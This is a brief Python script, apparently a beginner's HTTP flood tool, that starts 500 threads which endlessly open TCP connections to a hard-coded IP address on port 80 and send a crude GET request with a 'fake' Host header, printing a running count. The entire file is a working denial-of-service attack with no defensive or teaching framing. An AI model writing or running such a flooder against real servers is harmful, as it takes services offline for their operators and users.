import threading
import socket

target = "172.31.198.130"
port = 80
fake_id = "192.168.45.128"


already_connected = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_id + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()
        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected)


for i in range(500):
    thred = threading.Thread(target=attack)
    thred.start()
